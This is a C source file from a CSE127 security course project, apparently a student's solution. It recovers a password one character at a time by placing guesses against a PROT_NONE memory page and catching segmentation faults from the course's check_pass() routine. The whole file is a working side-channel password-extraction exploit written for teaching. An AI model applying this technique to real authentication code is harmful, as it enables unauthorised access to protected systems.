/*******************************************************
 CSE127 Project
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Password guesser using memory protection

 *******************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <setjmp.h>

// include our "system" header
#include "sysapp.h"

#define ASCII_MIN 33
#define ASCII_MAX 126

char *buffer;
char *page_start;
int page_size;

sigjmp_buf jumpout;

void handle_SEGV(int sig_num) {
    siglongjmp(jumpout, 1);
};


int main(int argc, char **argv) {
    char guess[33];
    char c;
    int ok;
    int len;

    // get the physical page size
    page_size = sysconf(_SC_PAGESIZE);

    //
    // allocate the buffer - we need at least 3 pages
    // (because malloc doesn't give us page aligned data)
    //   Page:   1111111111111111222222222222222233333333333333334444444
    //           ^ buffer        ^page_start                    ^ end of buffer
    //   Prot:   ++++++++++++++++----------------+++++++++++++++++++++++
    //
    buffer = (char *) malloc(3 * page_size);
    if (!buffer) {
        perror("malloc failed");
        exit(1);
    };

    // find the page start into buffer
    page_start = buffer + (page_size - ((unsigned long) buffer) % page_size);

    // fix the page start if there is not enough space
    if ((page_start - buffer) <= 32)
        page_start += page_size;

    // prohibit access to the page
    if (mprotect(page_start, page_size, PROT_NONE) == -1) {
        perror("mprotect failed");
    };


    // set initial guess to zeros
    bzero(guess, sizeof(guess));

    int numCharsFound = 0;
    

    //Keep a char array of the ones we found 
    // Then use memcpy to copy the number we have and add an extra char to the
    // end of it
   
    // while pass not found 
    while(1)
    {
        char currChar;        

        // Update and copy the current guess string 
        for (currChar = ASCII_MIN; currChar <= ASCII_MAX + 1; currChar++) { 
            if (currChar == ASCII_MAX + 1) 
                guess[numCharsFound] = '\0';
            else 
                guess[numCharsFound] = currChar;

            memcpy(page_start - numCharsFound - 1, &guess, numCharsFound + 1);

            if (sigsetjmp(jumpout, 1) == 1) {
                numCharsFound++; 
            } 

            signal(SIGSEGV, &handle_SEGV);

 
            if (check_pass((char*)page_start - numCharsFound - 1)) {
                printf("Password Found!\n");
                hack_system(guess);
                return 0; 
            };
        }
    }
    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
